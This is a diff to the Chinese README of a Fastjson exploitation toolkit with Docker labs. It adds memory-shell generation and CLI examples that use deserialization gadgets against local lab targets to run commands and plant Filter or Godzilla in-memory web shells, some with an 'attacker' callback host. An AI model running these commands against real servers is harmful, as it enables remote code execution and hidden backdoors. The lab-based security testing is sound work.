@@ -26,7 +26,7 @@ Fastjson 识别 / 版本探测 / PoC 工具箱。
 | ≤1.2.68 AutoCloseable 证明 PoC | ✅ | JDK 写/截断、commons-io io1–io5/ioFinal、读文件、MySQL/PG；靶场 `:18268` |
 | ≤1.2.80 Exception 缓存证明 PoC | ✅ | jackson→InputStream、commons-io 读写、PG/MySQL、groovy、aspectj、jython；靶场 `:18280` |
 | 各版本 PoC / 自定义字节码 | ⏳ | 通用自定义字节码上传 UI 等 |
-| 回显 / 内存马 | ⏳ | 1.2.83 PoC 已含回显与可选 MemShellParty；通用能力仍规划中 |
+| 回显 / 内存马 | ✅ | 通用回显 `poc/echo/`；内存马 `poc/memshell/`（内置 memshell-gen.jar，无需常驻 MemShellParty） |
 
 ## 快速开始（Web）
 
@@ -40,6 +40,12 @@ pip install -e ".[dev]"
 cd web
 npm install
 cd ..
+
+# （可选）构建内存马生成器 fat jar（约 40MB；首次使用 --memshell 前需要）
+# 需本机 Maven + JDK8+，代理见 AGENTS.md
+cd vendor/memshell-gen
+./build.ps1   # 或 ./build.sh
+cd ../..
 ```
 
 ### 2. 一键启停（不含 Docker 靶场）
@@ -80,20 +86,20 @@ chmod +x scripts/start.sh scripts/stop.sh
 | PoC 页 | http://127.0.0.1:3000/poc |
 | WAF 页 | http://127.0.0.1:3000/waf |
 | 设置页 | http://127.0.0.1:3000/settings |
-| 后端 API | http://127.0.0.1:8000 |
-| API 文档（Scalar） | http://127.0.0.1:8000/api/docs 或经前端代理 `/api/docs` |
-| Swagger UI | http://127.0.0.1:8000/api/swagger |
-| ReDoc | http://127.0.0.1:8000/api/redoc |
-| OpenAPI JSON | http://127.0.0.1:8000/api/openapi.json |
+| 后端 API | http://127.0.0.1:8000（若被占用/系统保留则自动换端口，以启动脚本输出为准） |
+| API 文档（Scalar） | 后端 `/api/docs` 或经前端代理 `/api/docs` |
+| Swagger UI | 后端 `/api/swagger` |
+| ReDoc | 后端 `/api/redoc` |
+| OpenAPI JSON | 后端 `/api/openapi.json` |
 
-日志目录：`.runtime/logs/`。
+日志目录：`.runtime/logs/`。Windows 上若默认 `8000` 落在 Hyper-V 排除端口段（`WinError 10013`），`start.bat` / `start.ps1` 会自动改用可用端口，并把 `API_ORIGIN` 传给前端。也可手动指定：`$env:BACKEND_PORT=8888`。
 
 手动启动：
 
 ```bash
-# 默认 --reload；生产可去掉 --reload
+# 默认 --reload；生产可去掉 --reload；端口被保留时改用例如 8888
 python -m uvicorn fastjson_toolkit.api.app:app --host 127.0.0.1 --port 8000 --reload
-cd web && npm run dev
+cd web && set API_ORIGIN=http://127.0.0.1:8000&& npm run dev
 ```
 
 ### 3. 配置 CEYE DNSLog
@@ -179,9 +185,13 @@ fjtoolkit poc-16723 -u http://127.0.0.1:18083 -H attacker -e -c id --engine unde
 
 # fd 缓存不出网
 fjtoolkit poc-16723 -u http://127.0.0.1:18083 -m fd -H attacker -e -c id --engine undertow
+
+# 内存马（默认内置 memshell-gen.jar，无需另起 MemShellParty）
+fjtoolkit poc-16723 -u http://127.0.0.1:18083 -H attacker --memshell \
+  --ms-server Undertow --ms-tool Command --ms-type Filter --ms-jdk 8
 ```
 
-也可：Web `/poc` 或 `POST /api/poc/cve-2026-16723`。
+也可：Web `/poc` 或 `POST /api/poc/cve-2026-16723`。内存马矩阵：`GET /api/memshell/config`。
 
 ### Fastjson ≤1.2.47 缓存绕过证明 payload
 
@@ -203,6 +213,9 @@ fjtoolkit poc-1247 -g jdbc_rowset -u http://127.0.0.1:18047/api/fastjson --send
 # getter 触发：有期望类时套 Currency（或 currency_json_key）
 fjtoolkit poc-1247 -g h2_jdbc --class-b64 "<base64>" -t currency
 fjtoolkit poc-1247 -g h2_jdbc --class-b64 "<base64>" -t currency_json_key --json-key-no-type
+
+# BCEL/H2 内存马（与 --echo 互斥）
+fjtoolkit poc-1247 -g h2_jdbc --memshell --ms-server Undertow --ms-tool Godzilla
 ```
 
 覆盖：`jdbc_rowset` / `bcel_tomcat_dbcp` / `bcel_tomcat_dbcp2` / `bcel_commons_dbcp` / `bcel_commons_dbcp2` / `c3p0_wrapper` / `mybatis_bcel` / `h2_jdbc`。  
@@ -219,7 +232,7 @@ docker compose up --build -d
 # http://127.0.0.1:18247/api/fastjson
 # GET/DELETE /api/markers 查看/清理 /tmp/fj1247_* 证明文件
 
-python scripts/lab_test_1247_gadgets.py
+python tests/lab/lab_test_1247_gadgets.py
 ```
 
 | 项 | 值 |
@@ -255,7 +268,7 @@ docker compose up --build -d
 # http://127.0.0.1:18268/api/fastjson
 # GET/DELETE /api/markers 查看/清理 /tmp/fj1268_* 
 
-python scripts/lab_test_1268_gadgets.py
+python tests/lab/lab_test_1268_gadgets.py
 ```
 
 | 项 | 值 |
@@ -289,7 +302,7 @@ docker compose up --build -d
 # http://127.0.0.1:18280/api/fastjson
 # POST /api/reset 清空共享 ParserConfig
 
-python scripts/lab_test_1280_gadgets.py
+python tests/lab/lab_test_1280_gadgets.py
 ```
 
 | 项 | 值 |
@@ -420,8 +433,9 @@ CLI：`fjtoolkit deps http://127.0.0.1:18080/api/fastjson`
 ├── src/fastjson_toolkit/     # Python 后端（detect / version / deps / expect / poc / api）
 ├── web/                      # Next.js + shadcn 前端
 ├── lab/                      # Docker 指纹靶场 + cve-2026-16723 Undertow
-├── tests/                    # 单元测试
-├── AGENTS.md                 # Agent / shadcn 约定
+├── tests/                    # pytest 单元测试
+├── tests/lab/                # 需 Docker 靶场的手动验证 / 压测脚本
+├── AGENTS.md                 # Agent 约定
 └── .env.example              # CEYE 等配置模板
 ```
 
@@ -430,6 +444,10 @@ CLI：`fjtoolkit deps http://127.0.0.1:18080/api/fastjson`
 ```bash
 pip install -e ".[dev]"
 pytest -q
+# 靶场落盘验证（需对应 lab 已 docker compose up）：
+# python tests/lab/lab_test_1247_gadgets.py
+# python tests/lab/lab_test_1268_gadgets.py
+# python tests/lab/lab_test_1280_gadgets.py
 ```
 
 ## 许可与安全
